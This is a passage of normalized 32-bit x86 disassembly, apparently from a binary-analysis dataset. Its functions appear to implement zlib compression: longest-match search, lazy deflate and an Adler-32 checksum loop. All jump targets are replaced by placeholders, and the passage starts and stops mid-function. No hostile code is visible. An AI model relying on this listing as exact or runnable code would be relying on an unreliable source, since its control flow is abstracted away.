mov [ edx + 0x64 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
mov ecx [ ecx + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x2 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
and eax [ edx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov cx [ ebp - 0x8 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov cx [ ecx + 0x64 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x58 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x58 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
jmp r-xdata
jmp r-xdata
sub_407d9a
push ebp
mov ebp esp
sub esp 0x34
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x74 ]
mov [ ebp - 0x2c ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x64 ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x70 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x88 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
sub ecx 0x106
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x64 ] ecx
jbe r-xdata
mov [ ebp - 0x34 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x24 ]
sub ecx 0x106
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
sub eax ecx
mov [ ebp - 0x34 ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
cmp edx [ ecx + 0x6c ]
jbe r-xdata
mov eax [ ebp - 0x2c ]
shr eax 0x2
mov [ ebp - 0x2c ] eax
mov ecx [ ebp - 0x34 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x38 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x2c ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
lea ecx [ ecx + eax + 0x102 ]
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x18 ]
mov al [ edx - 0x1 ]
mov [ ebp - 0x8 ] al
mov ecx [ ebp - 0x14 ]
add ecx [ ebp - 0x18 ]
mov dl [ ecx ]
mov [ ebp - 0x4 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x70 ]
cmp edx [ ecx + 0x84 ]
jb r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
add eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
add ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x4 ]
and eax 0xff
cmp edx eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx [ ebp - 0x18 ]
xor edx edx
mov dl [ ecx - 0x1 ]
mov eax [ ebp - 0x8 ]
and eax 0xff
cmp edx eax
jne r-xdata
mov eax [ ebp + 0xc ]
and eax [ ebp - 0x1c ]
mov ecx [ ebp - 0x28 ]
xor edx edx
mov dx [ ecx + eax * 2 ]
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0xc ]
cmp eax [ ebp - 0x20 ]
jbe r-xdata
mov ecx [ ebp - 0x10 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax ]
cmp edx ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x18 ]
cmp eax [ edx + 0x6c ]
ja r-xdata
mov ecx [ ebp - 0x2c ]
sub ecx 0x1
mov [ ebp - 0x2c ] ecx
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx + 0x1 ]
cmp ecx eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x6c ]
mov eax [ ebp - 0x18 ]
jmp r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x2
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x14 ]
mov ecx 0x102
sub ecx eax
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x30 ]
sub edx 0x102
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
xor ecx ecx
mov cl [ edx ]
cmp eax ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx + 0x68 ] edx
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x24 ]
cmp ecx [ ebp - 0xc ]
jl r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
mov dl [ eax ]
cmp ecx edx
jne r-xdata
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x18 ]
mov al [ edx - 0x1 ]
mov [ ebp - 0x8 ] al
mov ecx [ ebp - 0x14 ]
add ecx [ ebp - 0x18 ]
mov dl [ ecx ]
mov [ ebp - 0x4 ] dl
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
xor eax eax
mov al [ ecx ]
cmp edx eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
xor ecx ecx
mov cl [ edx ]
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
xor ecx ecx
mov cl [ eax ]
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
mov dl [ eax ]
cmp ecx edx
jne r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
xor eax eax
mov al [ ecx ]
cmp edx eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x14 ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
xor ecx ecx
mov cl [ edx ]
cmp eax ecx
jne r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x30 ]
jb r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x14 ]
xor edx edx
mov dl [ ecx ]
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
xor eax eax
mov al [ ecx ]
cmp edx eax
jne r-xdata
sub_4080c9
push ebp
mov ebp esp
sub esp 0x2c
push ebx
mov [ ebp - 0x8 ] 0x0
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x6c ] 0x3
jb r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_407570
add esp 0x4
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x6c ] 0x106
jae r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x58 ]
mov [ edx + 0x70 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x68 ]
mov [ edx + 0x5c ] ecx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x2
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x2 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
and eax [ edx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov cx [ ebp - 0x8 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov cx [ ecx + 0x64 ]
mov [ edx + eax * 2 ] cx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x70 ] 0x3
jb r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x70 ]
cmp edx [ ecx + 0x78 ]
jae r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x58 ]
cmp eax [ edx + 0x70 ]
ja r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
sub ecx [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
sub eax 0x106
cmp ecx eax
ja r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx + 0x60 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov dl [ ecx + edx - 0x1 ]
mov [ ebp - 0x18 ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x169c ]
mov [ eax + ecx * 2 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1690 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov al [ ebp - 0x18 ]
mov [ edx + ecx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1698 ] edx
mov ecx [ ebp - 0x18 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x8c ]
add ax 0x1
mov ecx [ ebp - 0x18 ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x8c ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
lea edx [ edx + ecx - 0x3 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x70 ]
sub ecx 0x3
mov [ ebp - 0x14 ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
sub eax [ ecx + 0x5c ]
mov [ ebp - 0x10 ] ax
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x169c ]
mov cx [ ebp - 0x10 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1690 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
mov cl [ ebp - 0x14 ]
mov [ eax + edx ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x1698 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x1698 ] eax
mov dx [ ebp - 0x10 ]
sub dx 0x1
mov [ ebp - 0x10 ] dx
mov eax [ ebp - 0x14 ]
and eax 0xff
xor ecx ecx
mov cl [ eax + r--data ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x490 ]
add ax 0x1
mov ecx [ ebp - 0x14 ]
and ecx 0xff
xor edx edx
mov dl [ ecx + r--data ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + edx * 4 + 0x490 ] ax
mov edx [ ebp - 0x10 ]
and edx 0xffff
cmp edx 0x100
jge r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x80 ] 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov dl [ ecx + edx - 0x1 ]
mov [ ebp - 0x1c ] dl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x169c ]
mov [ eax + ecx * 2 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1690 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1698 ]
mov al [ ebp - 0x1c ]
mov [ edx + ecx ] al
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1698 ]
add edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x1698 ] edx
mov ecx [ ebp - 0x1c ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x8c ]
add ax 0x1
mov ecx [ ebp - 0x1c ]
and ecx 0xff
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x8c ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x60 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x6c ] 0x106
jae r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x10 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x54 ] 0x0
jl r-xdata
mov edx [ ebp - 0x10 ]
and edx 0xffff
sar edx 0x7
xor eax eax
mov al [ edx + r--data ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x10 ]
and eax 0xffff
xor ecx ecx
mov cl [ eax + r--data ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x58 ] 0x5
ja r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_407d9a
add esp 0x8
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] eax
mov [ ebp - 0x2c ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0x2c ] ecx
jmp r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x28 ] 0x0
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x30 ]
mov ecx [ ebp + 0x8 ]
add eax [ ecx + 0x54 ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x70 ]
sub eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x70 ] eax
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x70 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ edx + 0x40 ]
mov ecx [ eax + 0x50 ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x30 ]
xor ebx ebx
mov bl [ eax + ecx + 0x2 ]
xor edx ebx
mov ecx [ ebp + 0x8 ]
and edx [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov [ eax + 0x40 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x40 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
xor eax eax
mov ax [ ecx + edx * 2 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
and eax [ edx + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x38 ]
mov cx [ ebp - 0x8 ]
mov [ edx + eax * 2 ] cx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x40 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov ecx [ ebp + 0x8 ]
mov cx [ ecx + 0x64 ]
mov [ edx + eax * 2 ] cx
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov ax [ edx + ecx * 4 + 0x980 ]
add ax 0x1
mov ecx [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 + 0x980 ] ax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1694 ]
sub ecx 0x1
mov edx [ ebp + 0x8 ]
xor eax eax
cmp [ edx + 0x1698 ] ecx
sete al
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x70 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x6c ]
sub ecx edx
mov edx [ ebp + 0x8 ]
mov [ edx + 0x6c ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x70 ]
sub ecx 0x2
mov edx [ ebp + 0x8 ]
mov [ edx + 0x70 ] ecx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x80 ] 0x1
je r-xdata
mov eax [ ebp + 0xc ]
sub eax 0x4
neg eax
sbb eax eax
and al 0xfe
add eax 0x3
xor eax eax
cmp [ ebp + 0xc ] 0x4
setne al
dec eax
and eax 0x2
jmp r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x4
sete al
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx + 0x64 ]
sub eax [ edx + 0x54 ]
push eax
mov ecx [ ebp - 0x2c ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_409232
add esp 0x10
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x64 ]
mov [ eax + 0x54 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ecx
call sub_406e20
add esp 0x4
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
jmp r-xdata
push 0x0
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x54 ]
push ecx
mov edx [ ebp - 0x28 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_409232
add esp 0x10
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
mov [ ecx + 0x54 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
push edx
call sub_406e20
add esp 0x4
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
add ecx 0x1
mov edx [ ebp + 0x8 ]
mov [ edx + 0x64 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
cmp ecx [ ebp - 0xc ]
ja r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x60 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x58 ] 0x2
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x64 ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x64 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x58 ] 0x2
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x58 ] 0x3
jne r-xdata
jmp r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x54 ] 0x0
jl r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ edx + 0x64 ]
sub ecx [ eax + 0x68 ]
cmp ecx 0x1000
jbe r-xdata
mov [ ebp - 0x24 ] 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
add ecx [ edx + 0x54 ]
mov [ ebp - 0x24 ] ecx
jmp r-xdata
xor eax eax
jmp r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ eax + 0x64 ]
sub edx [ ecx + 0x54 ]
push edx
mov eax [ ebp - 0x24 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_409232
add esp 0x10
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x64 ]
mov [ edx + 0x54 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push eax
call sub_406e20
add esp 0x4
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
sub_4087de
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0xc ]
push eax
call sub_40cec8
add esp 0x8
pop ebp
retn
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
add ecx eax
mov [ ebp + 0xc ] ecx
sub_408820
push ebp
mov ebp esp
sub esp 0x10
mov eax [ ebp + 0x8 ]
and eax 0xffff
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x8 ]
shr ecx 0x10
and ecx 0xffff
mov [ ebp - 0x8 ] ecx
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jbe r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
shl eax 0x10
or eax [ ebp - 0x4 ]
cmp [ ebp + 0x10 ] 0x15b0
jae r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x10 ] 0x15b0
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x1 ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x2 ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x3 ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x5 ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x6 ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0x7 ]
mov edx [ ebp - 0x4 ]
add edx ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
xor edx edx
mov dl [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
add eax edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
add ecx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp + 0xc ]
xor eax eax
mov al [ edx + 0x9 ]
mov ecx [ ebp - 0x4 ]
add ecx eax
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0x4 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov cl [ eax + 0xa ]
mov edx [ ebp - 0x4 ]
add edx ecx
